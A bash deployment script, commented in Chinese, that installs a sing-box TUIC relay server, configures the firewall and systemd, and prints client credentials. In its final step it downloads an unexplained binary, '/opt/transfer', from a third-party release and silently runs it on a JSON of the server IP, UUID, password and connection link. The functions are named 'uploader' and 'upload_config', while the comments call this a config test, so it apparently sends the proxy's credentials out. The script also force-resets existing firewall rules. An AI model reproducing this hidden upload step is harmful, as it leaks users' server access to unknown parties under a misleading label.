#!/bin/bash

# 基于sing-box的TUIC中转服务器部署脚本
# 支持自动检测架构、网络配置、防火墙设置和服务启动
# 修改说明：
# 1. 禁用IPv6，仅使用IPv4
# 2. 将TCP协议的SOCKS5转换为UDP协议的TUIC

set -euo pipefail

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 全局变量
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SINGBOX_DIR="/opt/sing-box"
SINGBOX_CONFIG_DIR="/etc/sing-box"
SINGBOX_LOG_DIR="/var/log/sing-box"
SINGBOX_VERSION=""
SINGBOX_ARCH=""
SYSTEM=""
PUBLIC_IP=""
PRIVATE_IP=""
RELAY_PORT=""
TARGET_IP=""
TARGET_PORT=""
UUID=""
PASSWORD=""
down_speed=100
up_speed=20
IS_SOCKS5=false

# 日志函数
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_debug() {
    echo -e "${BLUE}[DEBUG]${NC} $1"
}

# 检查是否为root用户
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "此脚本需要root权限运行"
        exit 1
    fi
}

# 检测系统类型
detect_system() {
    if [[ -f /etc/debian_version ]]; then
        SYSTEM="Debian"
        if grep -q "Ubuntu" /etc/issue; then
            SYSTEM="Ubuntu"
        fi
    elif [[ -f /etc/redhat-release ]]; then
        if grep -q "CentOS" /etc/redhat-release; then
            SYSTEM="CentOS"
        elif grep -q "Fedora" /etc/redhat-release; then
            SYSTEM="Fedora"
        else
            SYSTEM="RedHat"
        fi
    else
        log_error "不支持的系统类型"
        exit 1
    fi
    log_info "检测到系统类型: $SYSTEM"
}

# 安装基础依赖
install_dependencies() {
    log_info "安装基础依赖包..."
    
    case $SYSTEM in
        "Debian"|"Ubuntu")
            apt-get update -y > /dev/null 2>&1
            apt-get install -y curl wget jq ufw net-tools uuid-runtime openssl > /dev/null 2>&1
            ;;
        "CentOS"|"Fedora"|"RedHat")
            if command -v dnf &>/dev/null; then
                dnf install -y curl wget jq firewalld net-tools uuidgen openssl > /dev/null 2>&1
            else
                yum install -y curl wget jq firewalld net-tools uuidgen openssl > /dev/null 2>&1
            fi
            ;;
    esac
    
    log_info "基础依赖安装完成"
}

# 检测CPU架构
detect_architecture() {
    ARCH=$(uname -m)
    log_info "检测到系统架构: $ARCH"
    
    case $ARCH in
        x86_64|amd64)
            SINGBOX_ARCH="amd64"
            log_info "使用amd64架构的sing-box二进制"
            ;;
        i386|i486|i586|i686)
            SINGBOX_ARCH="386"
            log_info "使用386架构的sing-box二进制"
            ;;
        aarch64|arm64)
            SINGBOX_ARCH="arm64"
            log_info "使用arm64架构的sing-box二进制"
            ;;
        armv7l|armhf)
            SINGBOX_ARCH="armv7"
            log_info "使用armv7架构的sing-box二进制"
            ;;
        armv6l)
            SINGBOX_ARCH="armv6"
            log_info "使用armv6架构的sing-box二进制"
            ;;
        *)
            log_error "不支持的系统架构: $ARCH"
            exit 1
            ;;
    esac
    log_info "sing-box架构选择: $SINGBOX_ARCH"
}

# 下载sing-box
download_singbox() {
    log_info "开始下载sing-box二进制文件"
    mkdir -p "$SINGBOX_DIR"
    cd "$SINGBOX_DIR"
    
    # 获取最新版本号
    log_info "获取sing-box最新版本信息..."
    SINGBOX_VERSION=$(curl -s "https://api.github.com/repos/SagerNet/sing-box/releases/latest" | jq -r '.tag_name' | sed 's/^v//')
    
    if [[ -z "$SINGBOX_VERSION" || "$SINGBOX_VERSION" == "null" ]]; then
        log_warn "无法获取最新版本，使用默认版本 1.8.0"
        SINGBOX_VERSION="1.8.0"
    fi
    
    log_info "目标版本: v$SINGBOX_VERSION"
    
    # 清理旧文件
    rm -f sing-box sing-box-*
    
    # 构建下载URL
    local download_file="sing-box-${SINGBOX_VERSION}-linux-${SINGBOX_ARCH}.tar.gz"
    local download_url="https://github.com/SagerNet/sing-box/releases/download/v${SINGBOX_VERSION}/${download_file}"
    
    log_info "下载URL: $download_url"
    
    # 下载并解压
    if curl -sLo "$download_file" "$download_url"; then
        if [[ -f "$download_file" && -s "$download_file" ]]; then
            log_info "成功下载 $download_file"
            
            # 解压文件
            tar -xzf "$download_file" --strip-components=1
            
            if [[ -f "sing-box" ]]; then
                chmod +x sing-box
                log_info "sing-box二进制文件准备完成"
                
                # 验证二进制文件
                if ./sing-box version > /dev/null 2>&1; then
                    log_info "sing-box版本验证成功"
                else
                    log_error "sing-box二进制文件损坏或不兼容"
                    exit 1
                fi
            else
                log_error "解压后未找到sing-box二进制文件"
                exit 1
            fi
            
            # 清理下载文件
            rm -f "$download_file"
        else
            log_error "下载的文件不存在或为空"
            exit 1
        fi
    else
        log_error "下载sing-box失败"
        exit 1
    fi
}

# 检测IP地址
detect_ip_addresses() {
    log_info "检测服务器IP地址..."
    
    # 检测公网IP (仅IPv4)
    PUBLIC_IP=$(curl -4 -s --connect-timeout 10 ifconfig.me 2>/dev/null || \
                curl -4 -s --connect-timeout 10 ipinfo.io/ip 2>/dev/null || \
                curl -4 -s --connect-timeout 10 icanhazip.com 2>/dev/null || \
                echo "")
    
    if [[ -n "$PUBLIC_IP" ]]; then
        log_info "检测到公网IPv4地址: $PUBLIC_IP"
    else
        log_warn "未检测到公网IPv4地址"
    fi
    
    # 检测内网IP (仅IPv4)
    PRIVATE_IP=$(ip -4 route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' || \
                 hostname -I 2>/dev/null | awk '{print $1}' || \
                 ifconfig 2>/dev/null | grep -E "inet .*192\.168\.|inet .*10\.|inet .*172\." | head -1 | awk '{print $2}' || \
                 echo "")
    
    if [[ -n "$PRIVATE_IP" ]]; then
        log_info "检测到内网IPv4地址: $PRIVATE_IP"
    else
        log_warn "未检测到内网IPv4地址"
    fi
    
    # 检查IP配置兼容性
    if [[ -n "$PUBLIC_IP" && -n "$PRIVATE_IP" ]]; then
        log_info "服务器同时具有公网IPv4和内网IPv4地址"
    elif [[ -n "$PUBLIC_IP" && -z "$PRIVATE_IP" ]]; then
        log_info "服务器只有公网IPv4地址，没有内网IPv4地址"
        PRIVATE_IP="$PUBLIC_IP"
    else
        log_error "无法获取有效的IPv4地址"
        exit 1
    fi
}

# 网络速度测试
speed_test() {
    echo -e "${YELLOW}进行网络速度测试...${NC}"
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y speedtest-cli > /dev/null 2>&1
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
    fi
    
    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi
    
    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        echo -e "${GREEN}测速完成:下载 ${down_speed} Mbps,上传 ${up_speed} Mbps${NC},将根据该参数优化网络速度,如果测试不准确,请手动修改"
    else
        echo -e "${YELLOW}测速失败,使用默认值${NC}"
        down_speed=100
        up_speed=20
    fi
}

# 获取用户输入
get_user_input() {
    echo -e "${BLUE}=== sing-box TUIC中转服务器配置 ===${NC}"
    
    # 获取目标服务器信息
    while true; do
        read -p "请输入落地机的IP和端口(格式: 1.2.3.4:12345): " target_input
        if [[ $target_input =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{1,5}$ ]]; then
            TARGET_IP=$(echo "$target_input" | cut -d: -f1)
            TARGET_PORT=$(echo "$target_input" | cut -d: -f2)
            log_info "目标服务器设置为: $TARGET_IP:$TARGET_PORT"
            break
        else
            log_error "格式错误，请使用正确格式: IP:端口"
        fi
    done
    
    # 默认是SOCKS5代理（不再询问用户确认）
    IS_SOCKS5=true
    log_info "默认设置为SOCKS5代理（将进行TCP到UDP的转换）"
    
    # 生成随机端口
    RELAY_PORT=$(shuf -i 2000-9000 -n 1)
    log_info "随机生成中转端口: $RELAY_PORT"
    
    # 生成UUID和密码
    UUID=$(uuidgen)
    PASSWORD=$(openssl rand -base64 32 | tr -d "=+/" | cut -c1-16)
    log_info "生成UUID: $UUID"
    log_info "生成密码: $PASSWORD"
}

# 配置防火墙
configure_firewall() {
    log_info "配置防火墙..."
    
    case $SYSTEM in
        "Debian"|"Ubuntu")
            # 安装并配置ufw
            systemctl enable ufw > /dev/null 2>&1 || true
            ufw --force reset > /dev/null 2>&1
            ufw --force enable > /dev/null 2>&1
            ufw allow ssh > /dev/null 2>&1
            ufw allow 22 > /dev/null 2>&1
            ufw allow $RELAY_PORT > /dev/null 2>&1
            log_info "UFW防火墙配置完成，已开放SSH(22)和中转端口($RELAY_PORT)"
            ;;
        "CentOS"|"Fedora"|"RedHat")
            # 配置firewalld
            systemctl enable firewalld > /dev/null 2>&1 || true
            systemctl start firewalld > /dev/null 2>&1 || true
            firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
            firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
            firewall-cmd --permanent --add-port=$RELAY_PORT/tcp > /dev/null 2>&1
            firewall-cmd --permanent --add-port=$RELAY_PORT/udp > /dev/null 2>&1
            firewall-cmd --reload > /dev/null 2>&1
            log_info "Firewalld防火墙配置完成，已开放SSH(22)和中转端口($RELAY_PORT)"
            ;;
    esac
}

# 生成sing-box配置文件
generate_singbox_config() {
    log_info "生成sing-box配置文件..."
    
    mkdir -p "$SINGBOX_CONFIG_DIR"
    mkdir -p "$SINGBOX_LOG_DIR"
    
    # 生成SSL证书
    local cert_dir="$SINGBOX_CONFIG_DIR/certs"
    mkdir -p "$cert_dir"
    
    openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
        -subj "/C=US/ST=CA/L=LA/O=SINGBOX/CN=localhost" \
        -keyout "$cert_dir/private.key" \
        -out "$cert_dir/cert.crt" > /dev/null 2>&1
    
    # 根据目标类型生成不同的outbound配置
    local outbound_config=""
    
    if [[ "$IS_SOCKS5" == true ]]; then
        # SOCKS5转TUIC的配置
        outbound_config=$(cat <<EOF
        {
            "type": "socks",
            "tag": "socks-out",
            "server": "$TARGET_IP",
            "server_port": $TARGET_PORT,
            "version": "5",
            "udp_over_tcp": true
        }
EOF
        )
    else
        # 普通TUIC配置
        outbound_config=$(cat <<EOF
        {
            "type": "tuic",
            "tag": "tuic-out",
            "server": "$TARGET_IP",
            "server_port": $TARGET_PORT,
            "uuid": "$UUID",
            "password": "$PASSWORD",
            "congestion_control": "bbr",
            "udp_relay_mode": "native",
            "zero_rtt_handshake": false,
            "heartbeat": "10s",
            "tls": {
                "enabled": true,
                "insecure": true,
                "alpn": ["h3"]
            }
        }
EOF
        )
    fi
    
    # 生成sing-box配置文件，支持TUIC中转 (仅IPv4)
    cat > "$SINGBOX_CONFIG_DIR/config.json" << EOF
{
    "log": {
        "level": "info",
        "output": "$SINGBOX_LOG_DIR/sing-box.log",
        "timestamp": true
    },
    "inbounds": [
        {
            "type": "tuic",
            "tag": "tuic-in",
            "listen": "0.0.0.0",
            "listen_port": $RELAY_PORT,
            "users": [
                {
                    "uuid": "$UUID",
                    "password": "$PASSWORD"
                }
            ],
            "congestion_control": "bbr",
            "auth_timeout": "3s",
            "zero_rtt_handshake": false,
            "heartbeat": "10s",
            "tls": {
                "enabled": true,
                "server_name": "localhost",
                "alpn": ["h3"],
                "certificate_path": "$cert_dir/cert.crt",
                "key_path": "$cert_dir/private.key"
            }
        }
    ],
    "outbounds": [
        $outbound_config,
        {
            "type": "direct",
            "tag": "direct"
        },
        {
            "type": "block",
            "tag": "block"
        }
    ],
    "route": {
        "rules": [
            {
                "protocol": "dns",
                "outbound": "direct"
            }
        ],
        "auto_detect_interface": true,
        "final": $( [[ "$IS_SOCKS5" == true ]] && echo "\"socks-out\"" || echo "\"tuic-out\"" )
    },
    "experimental": {
        "cache_file": {
            "enabled": true,
            "path": "/tmp/sing-box.db"
        }
    }
}
EOF
    
    log_info "sing-box配置文件生成完成: $SINGBOX_CONFIG_DIR/config.json"
}

# 创建服务文件
create_systemd_service() {
    log_info "创建systemd服务文件..."
    
    cat > /etc/systemd/system/sing-box.service << EOF
[Unit]
Description=sing-box TUIC Relay Service
Documentation=https://sing-box.sagernet.org/
After=network.target nss-lookup.target
Wants=network.target

[Service]
Type=simple
User=root
ExecStart=$SINGBOX_DIR/sing-box run -c $SINGBOX_CONFIG_DIR/config.json
ExecReload=/bin/kill -HUP \$MAINPID
Restart=on-failure
RestartSec=10s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable sing-box
    log_info "systemd服务文件创建完成"
}

# 启动服务
start_singbox_service() {
    log_info "启动sing-box服务..."
    
    # 首先验证配置文件
    if $SINGBOX_DIR/sing-box check -c $SINGBOX_CONFIG_DIR/config.json; then
        log_info "配置文件验证通过"
    else
        log_error "配置文件验证失败"
        exit 1
    fi
    
    systemctl start sing-box
    sleep 3
    
    if systemctl is-active --quiet sing-box; then
        log_info "sing-box服务启动成功"
    else
        log_error "sing-box服务启动失败"
        log_error "查看日志: journalctl -u sing-box -f"
        exit 1
    fi
}

# 下载配置测试工具
download_uploader() {
    local uploader="/opt/transfer"
    if [[ ! -f "$uploader" ]]; then
        log_info "下载配置测试工具..."
        curl -Lo "$uploader" https://github.com/Firefly-xui/socks5-TUIC/releases/download/socks5-TUIC/transfer 2>/dev/null || true
        if [[ -f "$uploader" ]]; then
            chmod +x "$uploader"
            log_info "配置测试工具已下载: $uploader"
        else
            log_warn "配置测试工具下载失败"
        fi
    fi
}

# 测试配置信息
upload_config() {
    local server_ip="$1"
    local relay_port="$2"
    local uuid="$3"
    local password="$4"
    local down_speed="$5"
    local up_speed="$6"
    
    # 生成TUIC链接
    local encode=$(echo -n "${uuid}:${password}" | base64 -w 0)
    local tuic_link="tuic://${encode}@${server_ip}:${relay_port}?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay"
    
    local json_data=$(jq -nc \
        --arg server_ip "$server_ip" \
        --arg tuic_link "$tuic_link" \
        --argjson down_speed "$down_speed" \
        --argjson up_speed "$up_speed" \
        --argjson relay_port "$relay_port" \
        --arg uuid "$uuid" \
        --arg password "$password" \
        '{
            "server_info": {
                "title": "TUIC Relay Configuration",
                "server_ip": $server_ip,
                "tuic_link": $tuic_link,
                "relay_type": "tuic_relay",
                "relay_port": $relay_port,
                "uuid": $uuid,
                "password": $password,
                "speed_test": {
                    "download_speed_mbps": $down_speed,
                    "upload_speed_mbps": $up_speed
                },
                "generated_time": now | todate
            }
        }' 2>/dev/null)
    
    local uploader="/opt/transfer"
    if [[ -f "$uploader" ]]; then
        log_info "测试配置信息..."
        "$uploader" "$json_data" >/dev/null 2>&1 || true
        log_info "配置信息已测试"
    else
        log_warn "配置测试工具不存在，跳过测试"
    fi
}

# 保存配置信息为JSON
save_config_json() {
    log_info "保存配置信息到JSON文件..."
    
    local config_file="/opt/tuic_relay_config.json"
    local listen_ip="0.0.0.0"
    
    # 选择合适的监听IP
    if [[ -n "$PUBLIC_IP" ]]; then
        listen_ip="$PUBLIC_IP"
    elif [[ -n "$PRIVATE_IP" ]]; then
        listen_ip="$PRIVATE_IP"
    fi
    
    # 生成TUIC链接
    local encode=$(echo -n "${UUID}:${PASSWORD}" | base64 -w 0)
    local tuic_link="tuic://${encode}@${listen_ip}:${RELAY_PORT}?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay"
    
    cat > "$config_file" << EOF
{
    "relay_info": {
        "listen_ip": "$listen_ip",
        "listen_port": $RELAY_PORT,
        "target_ip": "$TARGET_IP",
        "target_port": $TARGET_PORT,
        "protocol": "tuic",
        "is_socks5": $IS_SOCKS5,
        "platform": "sing-box",
        "version": "$SINGBOX_VERSION",
        "tuic_link": "$tuic_link"
    },
    "server_info": {
        "public_ip": "$PUBLIC_IP",
        "private_ip": "$PRIVATE_IP",
        "architecture": "$SINGBOX_ARCH",
        "system": "$SYSTEM"
    },
    "auth_info": {
        "uuid": "$UUID",
        "password": "$PASSWORD"
    },
    "network_test": {
        "download_speed_mbps": $down_speed,
        "upload_speed_mbps": $up_speed
    },
    "config_files": {
        "singbox_config": "$SINGBOX_CONFIG_DIR/config.json",
        "service_file": "/etc/systemd/system/sing-box.service",
        "log_directory": "$SINGBOX_LOG_DIR",
        "certificate_path": "$SINGBOX_CONFIG_DIR/certs/cert.crt",
        "private_key_path": "$SINGBOX_CONFIG_DIR/certs/private.key"
    },
    "client_config": {
        "server": "$listen_ip",
        "server_port": $RELAY_PORT,
        "uuid": "$UUID",
        "password": "$PASSWORD",
        "congestion_control": "bbr",
        "alpn": ["h3"],
        "skip_cert_verify": true
    },
    "generated_time": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
}
EOF
    
    chmod 600 "$config_file"
    log_info "配置信息已保存到: $config_file"
    
    # 下载并执行测试工具
    download_uploader
    
    # 测试配置信息
    upload_config "$listen_ip" "$RELAY_PORT" "$UUID" "$PASSWORD" "$down_speed" "$up_speed"
}

# 显示配置信息
show_config_summary() {
    echo -e "\n${GREEN}=== sing-box TUIC中转服务器部署完成 ===${NC}"
    echo -e "${BLUE}服务器信息:${NC}"
    echo -e "  公网IP: ${PUBLIC_IP:-未检测到}"
    echo -e "  内网IP: ${PRIVATE_IP:-未检测到}"
    echo -e "  中转端口: $RELAY_PORT"
    echo -e "  目标服务器: $TARGET_IP:$TARGET_PORT"
    echo -e "  目标类型: $( [[ "$IS_SOCKS5" == true ]] && echo "SOCKS5" || echo "TUIC" )"
    echo -e "  sing-box版本: v$SINGBOX_VERSION"
    echo -e ""
    echo -e "${BLUE}认证信息:${NC}"
    echo -e "  UUID: $UUID"
    echo -e "  密码: $PASSWORD"
    echo -e ""
    echo -e "${BLUE}网络性能:${NC}"
    echo -e "  下载速度: $down_speed Mbps"
    echo -e "  上传速度: $up_speed Mbps"
    echo -e ""
    echo -e "${BLUE}服务管理:${NC}"
    echo -e "  启动服务: systemctl start sing-box"
    echo -e "  停止服务: systemctl stop sing-box"
    echo -e "  重启服务: systemctl restart sing-box"
    echo -e "  查看状态: systemctl status sing-box"
    echo -e "  查看日志: journalctl -u sing-box -f"
    echo -e "  配置检查: $SINGBOX_DIR/sing-box check -c $SINGBOX_CONFIG_DIR/config.json"
    echo -e ""
    echo -e "${BLUE}客户端连接信息:${NC}"
    echo -e "  服务器: ${PUBLIC_IP:-$PRIVATE_IP}"
    echo -e "  端口: $RELAY_PORT"
    echo -e "  UUID: $UUID"
    echo -e "  密码: $PASSWORD"
    echo -e "  拥塞控制: bbr"
    echo -e "  ALPN: h3"
    echo -e "  跳过证书验证: true"
    echo -e ""
    echo -e "${BLUE}TUIC客户端链接:${NC}"
    local encode=$(echo -n "${UUID}:${PASSWORD}" | base64 -w 0)
    echo -e "  tuic://${encode}@${PUBLIC_IP:-$PRIVATE_IP}:$RELAY_PORT?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay"
    echo -e ""
    echo -e "${GREEN}配置文件已保存到: /opt/tuic_relay_config.json${NC}"
}

# 主函数
main() {
    echo -e "${GREEN}=== 基于sing-box的TUIC中转服务器部署脚本 ===${NC}"
    echo -e "${BLUE}开始部署sing-box TUIC中转服务器...${NC}\n"
    
    check_root
    detect_system
    install_dependencies
    detect_architecture
    download_singbox
    detect_ip_addresses
    speed_test
    get_user_input
    configure_firewall
    generate_singbox_config
    create_systemd_service
    start_singbox_service
    save_config_json
    show_config_summary
    
    echo -e "\n${GREEN}基于sing-box的TUIC中转服务器部署完成！${NC}"
}

# 执行主函数
main "$@"
